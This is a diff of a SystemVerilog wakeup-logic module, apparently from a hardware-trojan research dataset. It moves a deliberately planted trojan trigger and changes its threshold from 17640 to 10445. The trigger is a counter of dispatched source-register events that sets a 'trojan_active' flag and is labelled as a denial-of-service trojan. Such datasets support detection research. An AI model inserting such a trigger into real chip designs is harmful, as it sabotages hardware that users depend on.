@@ -15,24 +15,6 @@ import SchedulerTypes::*;
 module WakeupLogic_trojan_DoS (
     WakeupSelectIF.WakeupLogic port
 );
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 17640;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (dispatchedSrcRegValid) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
     // Source status of dispatched instructions.
     logic dispatchedSrcRegValid  [ DISPATCH_WIDTH ][ ISSUE_QUEUE_SRC_REG_NUM ];
 
@@ -87,6 +69,23 @@ module WakeupLogic_trojan_DoS (
         .dispatchedSrcRegNum( dispatchedSrcRegNum ),
         .dispatchedSrcReady( dispatchedSrcRegReady  )
     );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=10445)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 10445;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (dispatchedSrcRegValid) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
 
     always_comb begin
         // Dispatch
